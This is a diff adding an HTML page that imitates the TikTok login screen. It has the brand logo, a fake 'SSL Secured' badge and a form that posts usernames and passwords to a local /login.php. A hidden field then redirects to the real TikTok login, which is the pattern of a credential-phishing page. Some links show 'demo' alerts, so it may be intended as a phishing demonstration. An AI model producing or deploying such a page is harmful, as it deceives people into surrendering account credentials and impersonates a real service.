@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            padding: 40px 30px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo svg {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+        
+        .logo h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #000;
+            letter-spacing: -0.5px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 52px;
+            background: #f5f5f5;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            background: #eeeeee;
+            box-shadow: 0 0 0 2px #ff0050;
+        }
+        
+        .card input::placeholder {
+            color: #999;
+        }
+        
+        .card button {
+            background: #ff0050;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #e60045;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+            margin: 10px 0;
+        }
+        
+        .forgot-row a {
+            color: #666;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-row a:hover {
+            color: #ff0050;
+        }
+        
+        .qr-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .qr-section:hover {
+            background: #eeeeee;
+        }
+        
+        .qr-icon {
+            font-size: 24px;
+        }
+        
+        .qr-text {
+            font-weight: 600;
+            color: #000;
+        }
+        
+        .qr-subtext {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e5e5;
+        }
+        
+        .divider::before {
+            margin-right: 12px;
+        }
+        
+        .divider::after {
+            margin-left: 12px;
+        }
+        
+        .social-buttons {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .social-btn {
+            flex: 1;
+            padding: 14px;
+            background: #f5f5f5;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .social-btn:hover {
+            background: #eeeeee;
+        }
+        
+        .signup {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 15px;
+            color: #333;
+        }
+        
+        .signup a {
+            color: #ff0050;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #ff0050;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #999;
+        }
+        
+        @media (max-width: 450px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .social-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- TikTok SVG Logo -->
+            <svg viewBox="0 0 24 24">
+                <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.04-.1z" fill="#ff0050"/>
+            </svg>
+            <h1>TikTok</h1>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://www.tiktok.com/login">
+                
+                <input type="text" name="username" placeholder="Username or email" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <div class="forgot-row">
+                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot password?</a>
+                </div>
+                
+                <button type="submit">Log In</button>
+            </form>
+            
+            <div class="qr-section" onclick="alert('QR code login demo'); return false;">
+                <span class="qr-icon">📱</span>
+                <div>
+                    <div class="qr-text">Log in with QR code</div>
+                    <div class="qr-subtext">Scan with TikTok app</div>
+                </div>
+            </div>
+            
+            <div class="divider">or continue with</div>
+            
+            <div class="social-buttons">
+                <button class="social-btn" onclick="alert('Google login demo'); return false;">
+                    <span>G</span> Google
+                </button>
+                <button class="social-btn" onclick="alert('Facebook login demo'); return false;">
+                    <span>f</span> Facebook
+                </button>
+            </div>
+            
+            <div class="signup">
+                Don't have an account? <a href="#" onclick="alert('Signup demo'); return false;">Sign up</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>TikTok © 2025</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Safety demo'); return false;">Safety</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please enter your username and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.background = '#eeeeee';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.background = '#f5f5f5';
+                }
+            });
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.querySelector('input[name="username"]').focus();
+        });
+    </script>
+</body>
+</html>
